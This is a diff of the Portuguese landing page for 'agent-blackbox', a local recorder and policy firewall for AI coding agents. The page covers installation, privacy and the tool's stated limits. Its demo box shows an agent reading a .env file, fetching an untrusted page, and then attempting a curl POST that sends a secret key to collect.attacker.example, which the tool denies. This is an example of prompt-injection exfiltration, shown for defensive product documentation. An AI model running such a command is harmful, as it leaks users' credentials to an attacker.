@@ -10,23 +10,51 @@
 <body>
 <header class="top"><div class="wrap"><nav>
 <strong>agent-blackbox</strong>
-<a href="index.html">English</a>
+<a href="#install">Instalação</a><a href="#privacy">Privacidade</a><a href="#limits">Limites</a><a href="index.html">English</a>
 <a href="https://github.com/developerfred/agent-blackbox">GitHub</a>
 </nav></div></header>
-<main class="wrap">
+<main>
+<div class="wrap">
 <section class="hero">
-<h1>Caixa-preta e firewall para agentes de IA de código</h1>
-<p class="lead">Cada prompt, chamada de ferramenta e resultado vai para um registro encadeado por hash e assinado com Ed25519, escrito por um processo separado. Um motor de política barra a <em>trifeta letal</em> (dado privado + conteúdo não confiável + chamada externa) antes de a chamada rodar. Claude Code primeiro; Codex, Cursor e Gemini CLI depois.</p>
-<p>Tudo roda na sua máquina: sem conta, sem nuvem, sem telemetria, sem dependências em runtime. Node 18+, Apache-2.0.</p>
+<div>
+<p class="eyebrow">Caixa-preta para agentes de código</p>
+<h1>Veja o que seu agente de IA fez. Barre antes de vazar.</h1>
+<p class="lead">Cada prompt, chamada de ferramenta e resultado vai para um registro encadeado por hash e assinado com Ed25519, escrito por um processo separado. Um motor de política barra a <em>trifeta letal</em> (dado privado, conteúdo não confiável e chamada externa) antes de a chamada rodar.</p>
+<p class="lead">Claude Code primeiro. Codex, Cursor e Gemini CLI depois.</p>
+<ul class="facts"><li>sem conta</li><li>sem nuvem</li><li>sem telemetria</li><li>zero dependências</li><li>Node 18+</li><li>Apache-2.0</li></ul>
+<div class="cta"><a class="btn primary" href="#install">Instalar</a><a class="btn" href="https://github.com/developerfred/agent-blackbox">Ver código</a></div>
+</div>
+<div class="ledger" role="img" aria-label="Trecho de uma sessão do blackbox demo: um segredo é lido, uma página é baixada e a chamada que enviaria o segredo para fora é negada.">
+<div class="ledger-head"><span>blackbox demo</span><span>trecho de sessão</span></div>
+<div class="ledger-body">
+<div class="rec"><span class="seq">#4</span><span><span class="tag ok">allowed</span></span><span class="cmd">Read /tmp/demo-repo/.env</span></div>
+<div class="rec"><span class="seq">#5</span><span><span class="tag ok">allowed</span></span><span class="cmd">WebFetch setup-docs.example.net/install</span></div>
+<div class="rec"><span class="seq">#6</span><span><span class="tag deny">denied</span></span><span class="cmd">curl -X POST collect.attacker.example/k -d "k=sk-demo-…"</span><span class="why">segredo lido em #4 aparece numa chamada externa</span></div>
+<div class="rec"><span class="seq">#7</span><span><span class="tag ask">ask</span></span><span class="cmd">curl collect.attacker.example/ping</span><span class="why">dado privado + conteúdo não confiável + saída</span></div>
+<div class="rec"><span class="seq">#8</span><span><span class="tag ok">allowed</span></span><span class="cmd">npm test</span></div>
+</div>
+<div class="ledger-foot">cada registro: seq · kind · digest · prev · hash · sig</div>
+</div>
 </section>
+</div>
 
+<div class="wrap">
+<section class="block" id="scan">
+<div class="label">Auditoria</div>
+<div class="content">
 <h2>Audite seu histórico</h2>
-<pre><code>npx agent-blackbox scan             # roda em paralelo (--jobs N)
+<p>Rode seu histórico do Claude Code pela política sem instalar nada. O scan roda em paralelo; <code>--jobs N</code> define o número de threads.</p>
+<pre><code>npx agent-blackbox scan
 npx agent-blackbox scan --html
 npx agent-blackbox skills
 npx agent-blackbox mcp</code></pre>
+</div>
+</section>
 
-<h2>Instalação</h2>
+<section class="block" id="install">
+<div class="label">Instalação</div>
+<div class="content stack">
+<h2>Grave e proteja cada sessão</h2>
 <pre><code>/plugin marketplace add developerfred/agent-blackbox
 /plugin install agent-blackbox@agent-blackbox
 
@@ -36,22 +64,35 @@ blackbox install
 blackbox timeline --last
 blackbox verify</code></pre>
 <p><code>blackbox uninstall</code> remove os hooks e mantém as evidências em <code>~/.blackbox</code>.</p>
+</div>
+</section>
 
-<h2>Privacidade</h2>
-<ul>
-<li>Nada sai da sua máquina: o gravador escuta só em <code>127.0.0.1</code>.</li>
+<section class="block" id="privacy">
+<div class="label">Privacidade</div>
+<div class="content">
+<h2>Nada sai da sua máquina</h2>
+<ul class="plain">
+<li>O gravador escuta só em <code>127.0.0.1</code>.</li>
 <li>Payloads e resumos são cifrados por sessão (AES-256-GCM). <code>blackbox purge</code> ou <code>retainDays</code> apaga de verdade, inclusive em backups.</li>
 <li>Texto de prompts e respostas via telemetria é opcional (<code>install --prompts</code>).</li>
 <li><code>install</code> mostra a chave e se o modo é fail-open; <code>--fail-closed</code> nega quando o gravador está parado.</li>
 <li>Detalhes: <a href="https://github.com/developerfred/agent-blackbox/blob/main/docs/PRIVACY.md">docs/PRIVACY.md</a> (em inglês).</li>
 </ul>
+</div>
+</section>
 
-<h2>Limites</h2>
-<ul>
+<section class="block" id="limits">
+<div class="label">Limites</div>
+<div class="content">
+<h2>O que ele não faz</h2>
+<ul class="plain">
 <li>Sem <code>blackbox harden</code> (gravador como usuário dedicado do sistema), um processo rodando como você consegue ler a chave mestra.</li>
 <li>O firewall pega padrões conhecidos, não todo ataque. É atrito e evidência, não garantia.</li>
 <li>A cadeia prova que nada gravado foi alterado, não que tudo foi gravado.</li>
 </ul>
+</div>
+</section>
+</div>
 </main>
 <footer><div class="wrap">Apache-2.0 · <a href="https://github.com/developerfred/agent-blackbox">código</a> · Esta página não carrega scripts, fontes nem rastreadores.</div></footer>
 </body>
